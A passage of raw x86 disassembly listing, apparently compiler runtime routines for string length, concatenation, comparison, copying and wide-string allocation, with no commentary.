  401c9d:	89 e2                	mov    %esp,%edx
  401c9f:	b9 01 00 00 00       	mov    $0x1,%ecx
  401ca4:	e8 03 ff ff ff       	call   0x401bac
  401ca9:	5a                   	pop    %edx
  401caa:	c3                   	ret
  401cab:	90                   	nop
  401cac:	31 c9                	xor    %ecx,%ecx
  401cae:	85 d2                	test   %edx,%edx
  401cb0:	74 21                	je     0x401cd3
  401cb2:	52                   	push   %edx
  401cb3:	3a 0a                	cmp    (%edx),%cl
  401cb5:	74 17                	je     0x401cce
  401cb7:	3a 4a 01             	cmp    0x1(%edx),%cl
  401cba:	74 11                	je     0x401ccd
  401cbc:	3a 4a 02             	cmp    0x2(%edx),%cl
  401cbf:	74 0b                	je     0x401ccc
  401cc1:	3a 4a 03             	cmp    0x3(%edx),%cl
  401cc4:	74 05                	je     0x401ccb
  401cc6:	83 c2 04             	add    $0x4,%edx
  401cc9:	eb e8                	jmp    0x401cb3
  401ccb:	42                   	inc    %edx
  401ccc:	42                   	inc    %edx
  401ccd:	42                   	inc    %edx
  401cce:	89 d1                	mov    %edx,%ecx
  401cd0:	5a                   	pop    %edx
  401cd1:	29 d1                	sub    %edx,%ecx
  401cd3:	e9 d4 fe ff ff       	jmp    0x401bac
  401cd8:	c3                   	ret
  401cd9:	8d 40 00             	lea    0x0(%eax),%eax
  401cdc:	31 c9                	xor    %ecx,%ecx
  401cde:	85 d2                	test   %edx,%edx
  401ce0:	74 2d                	je     0x401d0f
  401ce2:	52                   	push   %edx
  401ce3:	66 3b 0a             	cmp    (%edx),%cx
  401ce6:	74 20                	je     0x401d08
  401ce8:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  401cec:	74 17                	je     0x401d05
  401cee:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  401cf2:	74 0e                	je     0x401d02
  401cf4:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  401cf8:	74 05                	je     0x401cff
  401cfa:	83 c2 08             	add    $0x8,%edx
  401cfd:	eb e4                	jmp    0x401ce3
  401cff:	83 c2 02             	add    $0x2,%edx
  401d02:	83 c2 02             	add    $0x2,%edx
  401d05:	83 c2 02             	add    $0x2,%edx
  401d08:	89 d1                	mov    %edx,%ecx
  401d0a:	5a                   	pop    %edx
  401d0b:	29 d1                	sub    %edx,%ecx
  401d0d:	d1 e9                	shr    $1,%ecx
  401d0f:	e9 fc fe ff ff       	jmp    0x401c10
  401d14:	c3                   	ret
  401d15:	8d 40 00             	lea    0x0(%eax),%eax
  401d18:	31 c9                	xor    %ecx,%ecx
  401d1a:	8a 0a                	mov    (%edx),%cl
  401d1c:	42                   	inc    %edx
  401d1d:	e9 8a fe ff ff       	jmp    0x401bac
  401d22:	c3                   	ret
  401d23:	90                   	nop
  401d24:	57                   	push   %edi
  401d25:	50                   	push   %eax
  401d26:	51                   	push   %ecx
  401d27:	89 d7                	mov    %edx,%edi
  401d29:	31 c0                	xor    %eax,%eax
  401d2b:	f2 ae                	repnz scas %es:(%edi),%al
  401d2d:	75 02                	jne    0x401d31
  401d2f:	f7 d1                	not    %ecx
  401d31:	58                   	pop    %eax
  401d32:	01 c1                	add    %eax,%ecx
  401d34:	58                   	pop    %eax
  401d35:	5f                   	pop    %edi
  401d36:	e9 71 fe ff ff       	jmp    0x401bac
  401d3b:	c3                   	ret
  401d3c:	31 c9                	xor    %ecx,%ecx
  401d3e:	85 d2                	test   %edx,%edx
  401d40:	74 05                	je     0x401d47
  401d42:	8b 4a fc             	mov    -0x4(%edx),%ecx
  401d45:	d1 e9                	shr    $1,%ecx
  401d47:	e9 c4 fe ff ff       	jmp    0x401c10
  401d4c:	c3                   	ret
  401d4d:	8d 40 00             	lea    0x0(%eax),%eax
  401d50:	85 c0                	test   %eax,%eax
  401d52:	74 03                	je     0x401d57
  401d54:	8b 40 fc             	mov    -0x4(%eax),%eax
  401d57:	c3                   	ret
  401d58:	85 d2                	test   %edx,%edx
  401d5a:	74 3f                	je     0x401d9b
  401d5c:	8b 08                	mov    (%eax),%ecx
  401d5e:	85 c9                	test   %ecx,%ecx
  401d60:	0f 84 ae fd ff ff    	je     0x401b14
  401d66:	53                   	push   %ebx
  401d67:	56                   	push   %esi
  401d68:	57                   	push   %edi
  401d69:	89 c3                	mov    %eax,%ebx
  401d6b:	89 d6                	mov    %edx,%esi
  401d6d:	8b 79 fc             	mov    -0x4(%ecx),%edi
  401d70:	8b 56 fc             	mov    -0x4(%esi),%edx
  401d73:	01 fa                	add    %edi,%edx
  401d75:	39 ce                	cmp    %ecx,%esi
  401d77:	74 17                	je     0x401d90
  401d79:	e8 f6 02 00 00       	call   0x402074
  401d7e:	89 f0                	mov    %esi,%eax
  401d80:	8b 4e fc             	mov    -0x4(%esi),%ecx
  401d83:	8b 13                	mov    (%ebx),%edx
  401d85:	01 fa                	add    %edi,%edx
  401d87:	e8 cc f4 ff ff       	call   0x401258
  401d8c:	5f                   	pop    %edi
  401d8d:	5e                   	pop    %esi
  401d8e:	5b                   	pop    %ebx
  401d8f:	c3                   	ret
  401d90:	e8 df 02 00 00       	call   0x402074
  401d95:	8b 03                	mov    (%ebx),%eax
  401d97:	89 f9                	mov    %edi,%ecx
  401d99:	eb e8                	jmp    0x401d83
  401d9b:	c3                   	ret
  401d9c:	85 d2                	test   %edx,%edx
  401d9e:	74 61                	je     0x401e01
  401da0:	85 c9                	test   %ecx,%ecx
  401da2:	0f 84 6c fd ff ff    	je     0x401b14
  401da8:	3b 10                	cmp    (%eax),%edx
  401daa:	74 5c                	je     0x401e08
  401dac:	3b 08                	cmp    (%eax),%ecx
  401dae:	74 0e                	je     0x401dbe
  401db0:	50                   	push   %eax
  401db1:	51                   	push   %ecx
  401db2:	e8 5d fd ff ff       	call   0x401b14
  401db7:	5a                   	pop    %edx
  401db8:	58                   	pop    %eax
  401db9:	e9 9a ff ff ff       	jmp    0x401d58
  401dbe:	53                   	push   %ebx
  401dbf:	56                   	push   %esi
  401dc0:	57                   	push   %edi
  401dc1:	89 d3                	mov    %edx,%ebx
  401dc3:	89 ce                	mov    %ecx,%esi
  401dc5:	50                   	push   %eax
  401dc6:	8b 43 fc             	mov    -0x4(%ebx),%eax
  401dc9:	03 46 fc             	add    -0x4(%esi),%eax
  401dcc:	e8 af fd ff ff       	call   0x401b80
  401dd1:	89 c7                	mov    %eax,%edi
  401dd3:	89 c2                	mov    %eax,%edx
  401dd5:	89 d8                	mov    %ebx,%eax
  401dd7:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  401dda:	e8 79 f4 ff ff       	call   0x401258
  401ddf:	89 fa                	mov    %edi,%edx
  401de1:	89 f0                	mov    %esi,%eax
  401de3:	8b 4e fc             	mov    -0x4(%esi),%ecx
  401de6:	03 53 fc             	add    -0x4(%ebx),%edx
  401de9:	e8 6a f4 ff ff       	call   0x401258
  401dee:	58                   	pop    %eax
  401def:	89 fa                	mov    %edi,%edx
  401df1:	85 ff                	test   %edi,%edi
  401df3:	74 03                	je     0x401df8
  401df5:	ff 4f f8             	decl   -0x8(%edi)
  401df8:	e8 17 fd ff ff       	call   0x401b14
  401dfd:	5f                   	pop    %edi
  401dfe:	5e                   	pop    %esi
  401dff:	5b                   	pop    %ebx
  401e00:	c3                   	ret
  401e01:	89 ca                	mov    %ecx,%edx
  401e03:	e9 0c fd ff ff       	jmp    0x401b14
  401e08:	89 ca                	mov    %ecx,%edx
  401e0a:	e9 49 ff ff ff       	jmp    0x401d58
  401e0f:	c3                   	ret
  401e10:	53                   	push   %ebx
  401e11:	56                   	push   %esi
  401e12:	57                   	push   %edi
  401e13:	52                   	push   %edx
  401e14:	50                   	push   %eax
  401e15:	89 d3                	mov    %edx,%ebx
  401e17:	31 ff                	xor    %edi,%edi
  401e19:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  401e1d:	85 c9                	test   %ecx,%ecx
  401e1f:	74 06                	je     0x401e27
  401e21:	39 08                	cmp    %ecx,(%eax)
  401e23:	75 02                	jne    0x401e27
  401e25:	89 c7                	mov    %eax,%edi
  401e27:	31 c0                	xor    %eax,%eax
  401e29:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  401e2d:	85 c9                	test   %ecx,%ecx
  401e2f:	74 09                	je     0x401e3a
  401e31:	03 41 fc             	add    -0x4(%ecx),%eax
  401e34:	39 cf                	cmp    %ecx,%edi
  401e36:	75 02                	jne    0x401e3a
  401e38:	31 ff                	xor    %edi,%edi
  401e3a:	4a                   	dec    %edx
  401e3b:	75 ec                	jne    0x401e29
  401e3d:	85 ff                	test   %edi,%edi
  401e3f:	74 14                	je     0x401e55
  401e41:	89 c2                	mov    %eax,%edx
  401e43:	89 f8                	mov    %edi,%eax
  401e45:	8b 37                	mov    (%edi),%esi
  401e47:	8b 76 fc             	mov    -0x4(%esi),%esi
  401e4a:	e8 25 02 00 00       	call   0x402074
  401e4f:	57                   	push   %edi
  401e50:	03 37                	add    (%edi),%esi
  401e52:	4b                   	dec    %ebx
  401e53:	eb 08                	jmp    0x401e5d
  401e55:	e8 26 fd ff ff       	call   0x401b80
  401e5a:	50                   	push   %eax
  401e5b:	89 c6                	mov    %eax,%esi
  401e5d:	8b 44 9c 18          	mov    0x18(%esp,%ebx,4),%eax
  401e61:	89 f2                	mov    %esi,%edx
  401e63:	85 c0                	test   %eax,%eax
  401e65:	74 0a                	je     0x401e71
  401e67:	8b 48 fc             	mov    -0x4(%eax),%ecx
  401e6a:	01 ce                	add    %ecx,%esi
  401e6c:	e8 e7 f3 ff ff       	call   0x401258
  401e71:	4b                   	dec    %ebx
  401e72:	75 e9                	jne    0x401e5d
  401e74:	5a                   	pop    %edx
  401e75:	58                   	pop    %eax
  401e76:	85 ff                	test   %edi,%edi
  401e78:	75 0c                	jne    0x401e86
  401e7a:	85 d2                	test   %edx,%edx
  401e7c:	74 03                	je     0x401e81
  401e7e:	ff 4a f8             	decl   -0x8(%edx)
  401e81:	e8 8e fc ff ff       	call   0x401b14
  401e86:	5a                   	pop    %edx
  401e87:	5f                   	pop    %edi
  401e88:	5e                   	pop    %esi
  401e89:	5b                   	pop    %ebx
  401e8a:	58                   	pop    %eax
  401e8b:	8d 24 94             	lea    (%esp,%edx,4),%esp
  401e8e:	ff e0                	jmp    *%eax
  401e90:	c3                   	ret
  401e91:	8d 40 00             	lea    0x0(%eax),%eax
  401e94:	53                   	push   %ebx
  401e95:	56                   	push   %esi
  401e96:	57                   	push   %edi
  401e97:	89 c6                	mov    %eax,%esi
  401e99:	89 d7                	mov    %edx,%edi
  401e9b:	39 d0                	cmp    %edx,%eax
  401e9d:	0f 84 8f 00 00 00    	je     0x401f32
  401ea3:	85 f6                	test   %esi,%esi
  401ea5:	74 68                	je     0x401f0f
  401ea7:	85 ff                	test   %edi,%edi
  401ea9:	74 6b                	je     0x401f16
  401eab:	8b 46 fc             	mov    -0x4(%esi),%eax
  401eae:	8b 57 fc             	mov    -0x4(%edi),%edx
  401eb1:	29 d0                	sub    %edx,%eax
  401eb3:	77 02                	ja     0x401eb7
  401eb5:	01 c2                	add    %eax,%edx
  401eb7:	52                   	push   %edx
  401eb8:	c1 ea 02             	shr    $0x2,%edx
  401ebb:	74 26                	je     0x401ee3
  401ebd:	8b 0e                	mov    (%esi),%ecx
  401ebf:	8b 1f                	mov    (%edi),%ebx
  401ec1:	39 d9                	cmp    %ebx,%ecx
  401ec3:	75 58                	jne    0x401f1d
  401ec5:	4a                   	dec    %edx
  401ec6:	74 15                	je     0x401edd
  401ec8:	8b 4e 04             	mov    0x4(%esi),%ecx
  401ecb:	8b 5f 04             	mov    0x4(%edi),%ebx
  401ece:	39 d9                	cmp    %ebx,%ecx
  401ed0:	75 4b                	jne    0x401f1d
  401ed2:	83 c6 08             	add    $0x8,%esi
  401ed5:	83 c7 08             	add    $0x8,%edi
  401ed8:	4a                   	dec    %edx
  401ed9:	75 e2                	jne    0x401ebd
  401edb:	eb 06                	jmp    0x401ee3
  401edd:	83 c6 04             	add    $0x4,%esi
  401ee0:	83 c7 04             	add    $0x4,%edi
  401ee3:	5a                   	pop    %edx
  401ee4:	83 e2 03             	and    $0x3,%edx
  401ee7:	74 22                	je     0x401f0b
  401ee9:	8b 0e                	mov    (%esi),%ecx
  401eeb:	8b 1f                	mov    (%edi),%ebx
  401eed:	38 d9                	cmp    %bl,%cl
  401eef:	75 41                	jne    0x401f32
  401ef1:	4a                   	dec    %edx
  401ef2:	74 17                	je     0x401f0b
  401ef4:	38 fd                	cmp    %bh,%ch
  401ef6:	75 3a                	jne    0x401f32
  401ef8:	4a                   	dec    %edx
  401ef9:	74 10                	je     0x401f0b
  401efb:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  401f01:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  401f07:	39 d9                	cmp    %ebx,%ecx
  401f09:	75 27                	jne    0x401f32
  401f0b:	01 c0                	add    %eax,%eax
  401f0d:	eb 23                	jmp    0x401f32
  401f0f:	8b 57 fc             	mov    -0x4(%edi),%edx
  401f12:	29 d0                	sub    %edx,%eax
  401f14:	eb 1c                	jmp    0x401f32
  401f16:	8b 46 fc             	mov    -0x4(%esi),%eax
  401f19:	29 d0                	sub    %edx,%eax
  401f1b:	eb 15                	jmp    0x401f32
  401f1d:	5a                   	pop    %edx
  401f1e:	38 d9                	cmp    %bl,%cl
  401f20:	75 10                	jne    0x401f32
  401f22:	38 fd                	cmp    %bh,%ch
  401f24:	75 0c                	jne    0x401f32
  401f26:	c1 e9 10             	shr    $0x10,%ecx
  401f29:	c1 eb 10             	shr    $0x10,%ebx
  401f2c:	38 d9                	cmp    %bl,%cl
  401f2e:	75 02                	jne    0x401f32
  401f30:	38 fd                	cmp    %bh,%ch
  401f32:	5f                   	pop    %edi
  401f33:	5e                   	pop    %esi
  401f34:	5b                   	pop    %ebx
  401f35:	c3                   	ret
  401f36:	8b c0                	mov    %eax,%eax
  401f38:	85 c0                	test   %eax,%eax
  401f3a:	74 09                	je     0x401f45
  401f3c:	8b 50 f8             	mov    -0x8(%eax),%edx
  401f3f:	42                   	inc    %edx
  401f40:	7e 03                	jle    0x401f45
  401f42:	ff 40 f8             	incl   -0x8(%eax)
  401f45:	c3                   	ret
  401f46:	8b c0                	mov    %eax,%eax
  401f48:	85 c0                	test   %eax,%eax
  401f4a:	74 02                	je     0x401f4e
  401f4c:	c3                   	ret
  401f4d:	00 b8 4d 1f 40 00    	add    %bh,0x401f4d(%eax)
  401f53:	c3                   	ret
  401f54:	8b 10                	mov    (%eax),%edx
  401f56:	85 d2                	test   %edx,%edx
  401f58:	74 37                	je     0x401f91
  401f5a:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401f5d:	49                   	dec    %ecx
  401f5e:	74 31                	je     0x401f91
  401f60:	53                   	push   %ebx
  401f61:	89 c3                	mov    %eax,%ebx
  401f63:	8b 42 fc             	mov    -0x4(%edx),%eax
  401f66:	e8 15 fc ff ff       	call   0x401b80
  401f6b:	89 c2                	mov    %eax,%edx
  401f6d:	8b 03                	mov    (%ebx),%eax
  401f6f:	89 13                	mov    %edx,(%ebx)
  401f71:	50                   	push   %eax
  401f72:	8b 48 fc             	mov    -0x4(%eax),%ecx
  401f75:	e8 de f2 ff ff       	call   0x401258
  401f7a:	58                   	pop    %eax
  401f7b:	8b 48 f8             	mov    -0x8(%eax),%ecx
  401f7e:	49                   	dec    %ecx
  401f7f:	7c 0d                	jl     0x401f8e
  401f81:	ff 48 f8             	decl   -0x8(%eax)
  401f84:	75 08                	jne    0x401f8e
  401f86:	8d 40 f8             	lea    -0x8(%eax),%eax
  401f89:	e8 fe f1 ff ff       	call   0x40118c
  401f8e:	8b 13                	mov    (%ebx),%edx
  401f90:	5b                   	pop    %ebx
  401f91:	89 d0                	mov    %edx,%eax
  401f93:	c3                   	ret
  401f94:	e9 bb ff ff ff       	jmp    0x401f54
  401f99:	c3                   	ret
  401f9a:	8b c0                	mov    %eax,%eax
  401f9c:	e9 b3 ff ff ff       	jmp    0x401f54
  401fa1:	c3                   	ret
  401fa2:	8b c0                	mov    %eax,%eax
  401fa4:	53                   	push   %ebx
  401fa5:	85 c0                	test   %eax,%eax
  401fa7:	74 2d                	je     0x401fd6
  401fa9:	8b 58 fc             	mov    -0x4(%eax),%ebx
  401fac:	85 db                	test   %ebx,%ebx
  401fae:	74 26                	je     0x401fd6
  401fb0:	4a                   	dec    %edx
  401fb1:	7c 1b                	jl     0x401fce
  401fb3:	39 da                	cmp    %ebx,%edx
  401fb5:	7d 1f                	jge    0x401fd6
  401fb7:	29 d3                	sub    %edx,%ebx
  401fb9:	85 c9                	test   %ecx,%ecx
  401fbb:	7c 19                	jl     0x401fd6
  401fbd:	39 d9                	cmp    %ebx,%ecx
  401fbf:	7f 11                	jg     0x401fd2
  401fc1:	01 c2                	add    %eax,%edx
  401fc3:	8b 44 24 08          	mov    0x8(%esp),%eax
  401fc7:	e8 e0 fb ff ff       	call   0x401bac
  401fcc:	eb 11                	jmp    0x401fdf
  401fce:	31 d2                	xor    %edx,%edx
  401fd0:	eb e5                	jmp    0x401fb7
  401fd2:	89 d9                	mov    %ebx,%ecx
  401fd4:	eb eb                	jmp    0x401fc1
  401fd6:	8b 44 24 08          	mov    0x8(%esp),%eax
  401fda:	e8 e1 fa ff ff       	call   0x401ac0
  401fdf:	5b                   	pop    %ebx
  401fe0:	c2 04 00             	ret    $0x4
  401fe3:	c3                   	ret
  401fe4:	53                   	push   %ebx
  401fe5:	56                   	push   %esi
  401fe6:	57                   	push   %edi
  401fe7:	89 c3                	mov    %eax,%ebx
  401fe9:	89 d6                	mov    %edx,%esi
  401feb:	89 cf                	mov    %ecx,%edi
  401fed:	e8 a2 ff ff ff       	call   0x401f94
  401ff2:	8b 13                	mov    (%ebx),%edx
  401ff4:	85 d2                	test   %edx,%edx
  401ff6:	74 30                	je     0x402028
  401ff8:	8b 4a fc             	mov    -0x4(%edx),%ecx
  401ffb:	4e                   	dec    %esi
  401ffc:	7c 2a                	jl     0x402028
  401ffe:	39 ce                	cmp    %ecx,%esi
  402000:	7d 26                	jge    0x402028
  402002:	85 ff                	test   %edi,%edi
  402004:	7e 22                	jle    0x402028
  402006:	29 f1                	sub    %esi,%ecx
  402008:	39 cf                	cmp    %ecx,%edi
  40200a:	7e 02                	jle    0x40200e
  40200c:	89 cf                	mov    %ecx,%edi
  40200e:	29 f9                	sub    %edi,%ecx
  402010:	01 f2                	add    %esi,%edx
  402012:	8d 04 17             	lea    (%edi,%edx,1),%eax
  402015:	e8 3e f2 ff ff       	call   0x401258
  40201a:	8b 13                	mov    (%ebx),%edx
  40201c:	89 d8                	mov    %ebx,%eax
  40201e:	8b 52 fc             	mov    -0x4(%edx),%edx
  402021:	29 fa                	sub    %edi,%edx
  402023:	e8 4c 00 00 00       	call   0x402074
  402028:	5f                   	pop    %edi
  402029:	5e                   	pop    %esi
  40202a:	5b                   	pop    %ebx
  40202b:	c3                   	ret
  40202c:	85 c0                	test   %eax,%eax
  40202e:	74 40                	je     0x402070
  402030:	85 d2                	test   %edx,%edx
  402032:	74 31                	je     0x402065
  402034:	53                   	push   %ebx
  402035:	56                   	push   %esi
  402036:	57                   	push   %edi
  402037:	89 c6                	mov    %eax,%esi
  402039:	89 d7                	mov    %edx,%edi
  40203b:	8b 4f fc             	mov    -0x4(%edi),%ecx
  40203e:	57                   	push   %edi
  40203f:	8b 56 fc             	mov    -0x4(%esi),%edx
  402042:	4a                   	dec    %edx
  402043:	78 1b                	js     0x402060
  402045:	8a 06                	mov    (%esi),%al
  402047:	46                   	inc    %esi
  402048:	29 d1                	sub    %edx,%ecx
  40204a:	7e 14                	jle    0x402060
  40204c:	f2 ae                	repnz scas %es:(%edi),%al
  40204e:	75 10                	jne    0x402060
  402050:	89 cb                	mov    %ecx,%ebx
  402052:	56                   	push   %esi
  402053:	57                   	push   %edi
  402054:	89 d1                	mov    %edx,%ecx
  402056:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  402058:	5f                   	pop    %edi
  402059:	5e                   	pop    %esi
  40205a:	74 0c                	je     0x402068
  40205c:	89 d9                	mov    %ebx,%ecx
  40205e:	eb ec                	jmp    0x40204c
  402060:	5a                   	pop    %edx
  402061:	31 c0                	xor    %eax,%eax
  402063:	eb 08                	jmp    0x40206d
  402065:	31 c0                	xor    %eax,%eax
  402067:	c3                   	ret
  402068:	5a                   	pop    %edx
  402069:	89 f8                	mov    %edi,%eax
  40206b:	29 d0                	sub    %edx,%eax
  40206d:	5f                   	pop    %edi
  40206e:	5e                   	pop    %esi
  40206f:	5b                   	pop    %ebx
  402070:	c3                   	ret
  402071:	8d 40 00             	lea    0x0(%eax),%eax
  402074:	53                   	push   %ebx
  402075:	56                   	push   %esi
  402076:	57                   	push   %edi
  402077:	89 c3                	mov    %eax,%ebx
  402079:	89 d6                	mov    %edx,%esi
  40207b:	31 ff                	xor    %edi,%edi
  40207d:	85 d2                	test   %edx,%edx
  40207f:	7e 48                	jle    0x4020c9
  402081:	8b 03                	mov    (%ebx),%eax
  402083:	85 c0                	test   %eax,%eax
  402085:	74 23                	je     0x4020aa
  402087:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  40208b:	75 1d                	jne    0x4020aa
  40208d:	83 e8 08             	sub    $0x8,%eax
  402090:	83 c2 09             	add    $0x9,%edx
  402093:	50                   	push   %eax
  402094:	89 e0                	mov    %esp,%eax
  402096:	e8 09 f1 ff ff       	call   0x4011a4
  40209b:	58                   	pop    %eax
  40209c:	83 c0 08             	add    $0x8,%eax
  40209f:	89 03                	mov    %eax,(%ebx)
  4020a1:	89 70 fc             	mov    %esi,-0x4(%eax)
  4020a4:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  4020a8:	eb 28                	jmp    0x4020d2
  4020aa:	89 d0                	mov    %edx,%eax
  4020ac:	e8 cf fa ff ff       	call   0x401b80
  4020b1:	89 c7                	mov    %eax,%edi
  4020b3:	8b 03                	mov    (%ebx),%eax
  4020b5:	85 c0                	test   %eax,%eax
  4020b7:	74 10                	je     0x4020c9
  4020b9:	89 fa                	mov    %edi,%edx
  4020bb:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4020be:	39 f1                	cmp    %esi,%ecx
  4020c0:	7c 02                	jl     0x4020c4
  4020c2:	89 f1                	mov    %esi,%ecx
  4020c4:	e8 8f f1 ff ff       	call   0x401258
  4020c9:	89 d8                	mov    %ebx,%eax
  4020cb:	e8 f0 f9 ff ff       	call   0x401ac0
  4020d0:	89 3b                	mov    %edi,(%ebx)
  4020d2:	5f                   	pop    %edi
  4020d3:	5e                   	pop    %esi
  4020d4:	5b                   	pop    %ebx
  4020d5:	c3                   	ret
  4020d6:	8b c0                	mov    %eax,%eax
  4020d8:	b0 01                	mov    $0x1,%al
  4020da:	e9 6d f1 ff ff       	jmp    0x40124c
  4020df:	c3                   	ret
  4020e0:	85 c0                	test   %eax,%eax
  4020e2:	74 10                	je     0x4020f4
  4020e4:	50                   	push   %eax
  4020e5:	6a 00                	push   $0x0
  4020e7:	e8 18 f0 ff ff       	call   0x401104
  4020ec:	85 c0                	test   %eax,%eax
  4020ee:	0f 84 e4 ff ff ff    	je     0x4020d8
  4020f4:	c3                   	ret
  4020f5:	8d 40 00             	lea    0x0(%eax),%eax
  4020f8:	87 10                	xchg   %edx,(%eax)
  4020fa:	85 d2                	test   %edx,%edx
  4020fc:	74 06                	je     0x402104
  4020fe:	52                   	push   %edx
  4020ff:	e8 10 f0 ff ff       	call   0x401114
  402104:	c3                   	ret
  402105:	8d 40 00             	lea    0x0(%eax),%eax
  402108:	8b 10                	mov    (%eax),%edx
  40210a:	85 d2                	test   %edx,%edx
  40210c:	74 0e                	je     0x40211c
  40210e:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  402114:	50                   	push   %eax
  402115:	52                   	push   %edx
  402116:	e8 f9 ef ff ff       	call   0x401114
  40211b:	58                   	pop    %eax
  40211c:	c3                   	ret
  40211d:	8d 40 00             	lea    0x0(%eax),%eax
  402120:	53                   	push   %ebx
  402121:	56                   	push   %esi
  402122:	89 c3                	mov    %eax,%ebx
  402124:	89 d6                	mov    %edx,%esi
  402126:	8b 03                	mov    (%ebx),%eax
  402128:	85 c0                	test   %eax,%eax
  40212a:	74 0c                	je     0x402138
  40212c:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  402132:	50                   	push   %eax
  402133:	e8 dc ef ff ff       	call   0x401114
  402138:	83 c3 04             	add    $0x4,%ebx
  40213b:	4e                   	dec    %esi
  40213c:	75 e8                	jne    0x402126
  40213e:	5e                   	pop    %esi
  40213f:	5b                   	pop    %ebx
  402140:	c3                   	ret
  402141:	8d 40 00             	lea    0x0(%eax),%eax
  402144:	85 d2                	test   %edx,%edx
  402146:	0f 84 bc ff ff ff    	je     0x402108
  40214c:	8b 4a fc             	mov    -0x4(%edx),%ecx
  40214f:	d1 e9                	shr    $1,%ecx
  402151:	0f 84 b1 ff ff ff    	je     0x402108
  402157:	51                   	push   %ecx
  402158:	52                   	push   %edx
  402159:	50                   	push   %eax
  40215a:	e8 ad ef ff ff       	call   0x40110c
  40215f:	85 c0                	test   %eax,%eax
  402161:	0f 84 71 ff ff ff    	je     0x4020d8
  402167:	c3                   	ret
  402168:	53                   	push   %ebx
  402169:	56                   	push   %esi
  40216a:	57                   	push   %edi
  40216b:	55                   	push   %ebp
  40216c:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  402172:	50                   	push   %eax
  402173:	83 c4 fc             	add    $0xfffffffc,%esp
  402176:	8b f1                	mov    %ecx,%esi
  402178:	89 14 24             	mov    %edx,(%esp)
  40217b:	8b f8                	mov    %eax,%edi
  40217d:	85 f6                	test   %esi,%esi
  40217f:	7f 09                	jg     0x40218a
  402181:	8b c7                	mov    %edi,%eax
  402183:	e8 80 ff ff ff       	call   0x402108
  402188:	eb 5d                	jmp    0x4021e7
  40218a:	8d 6e 01             	lea    0x1(%esi),%ebp
  40218d:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  402193:	7d 28                	jge    0x4021bd
  402195:	56                   	push   %esi
  402196:	8d 44 24 08          	lea    0x8(%esp),%eax
  40219a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40219e:	ba ff 07 00 00       	mov    $0x7ff,%edx
  4021a3:	e8 50 fa ff ff       	call   0x401bf8
  4021a8:	8b d8                	mov    %eax,%ebx
  4021aa:	85 db                	test   %ebx,%ebx
  4021ac:	7e 0f                	jle    0x4021bd
  4021ae:	8d 54 24 04          	lea    0x4(%esp),%edx
  4021b2:	8b c7                	mov    %edi,%eax
  4021b4:	8b cb                	mov    %ebx,%ecx
  4021b6:	e8 39 00 00 00       	call   0x4021f4
  4021bb:	eb 2a                	jmp    0x4021e7
  4021bd:	8b dd                	mov    %ebp,%ebx
  4021bf:	8b c7                	mov    %edi,%eax
  4021c1:	8b d3                	mov    %ebx,%edx
  4021c3:	e8 20 02 00 00       	call   0x4023e8
  4021c8:	56                   	push   %esi
  4021c9:	8b 07                	mov    (%edi),%eax
  4021cb:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4021cf:	8b d3                	mov    %ebx,%edx
  4021d1:	e8 22 fa ff ff       	call   0x401bf8
  4021d6:	8b d8                	mov    %eax,%ebx
  4021d8:	85 db                	test   %ebx,%ebx
  4021da:	7d 02                	jge    0x4021de
  4021dc:	33 db                	xor    %ebx,%ebx
  4021de:	8b c7                	mov    %edi,%eax
  4021e0:	8b d3                	mov    %ebx,%edx
  4021e2:	e8 01 02 00 00       	call   0x4023e8
  4021e7:	81 c4 04 10 00 00    	add    $0x1004,%esp
  4021ed:	5d                   	pop    %ebp
  4021ee:	5f                   	pop    %edi
  4021ef:	5e                   	pop    %esi
  4021f0:	5b                   	pop    %ebx
  4021f1:	c3                   	ret
  4021f2:	8b c0                	mov    %eax,%eax
  4021f4:	85 c9                	test   %ecx,%ecx
  4021f6:	0f 84 0c ff ff ff    	je     0x402108
  4021fc:	50                   	push   %eax
  4021fd:	51                   	push   %ecx
  4021fe:	52                   	push   %edx
  4021ff:	e8 00 ef ff ff       	call   0x401104
  402204:	85 c0                	test   %eax,%eax
  402206:	0f 84 cc fe ff ff    	je     0x4020d8
  40220c:	5a                   	pop    %edx
  40220d:	ff 32                	push   (%edx)
  40220f:	89 02                	mov    %eax,(%edx)
  402211:	e8 fe ee ff ff       	call   0x401114
  402216:	c3                   	ret
  402217:	90                   	nop
  402218:	31 c9                	xor    %ecx,%ecx
  40221a:	85 d2                	test   %edx,%edx
  40221c:	74 2d                	je     0x40224b
  40221e:	52                   	push   %edx
  40221f:	66 3b 0a             	cmp    (%edx),%cx
  402222:	74 20                	je     0x402244
  402224:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  402228:	74 17                	je     0x402241
  40222a:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  40222e:	74 0e                	je     0x40223e
  402230:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  402234:	74 05                	je     0x40223b
  402236:	83 c2 08             	add    $0x8,%edx
  402239:	eb e4                	jmp    0x40221f
  40223b:	83 c2 02             	add    $0x2,%edx
  40223e:	83 c2 02             	add    $0x2,%edx
  402241:	83 c2 02             	add    $0x2,%edx
  402244:	89 d1                	mov    %edx,%ecx
  402246:	5a                   	pop    %edx
  402247:	29 d1                	sub    %edx,%ecx
  402249:	d1 e9                	shr    $1,%ecx
  40224b:	e9 a4 ff ff ff       	jmp    0x4021f4
  402250:	c3                   	ret
  402251:	8d 40 00             	lea    0x0(%eax),%eax
  402254:	31 c9                	xor    %ecx,%ecx
  402256:	85 d2                	test   %edx,%edx
  402258:	74 03                	je     0x40225d
  40225a:	8b 4a fc             	mov    -0x4(%edx),%ecx
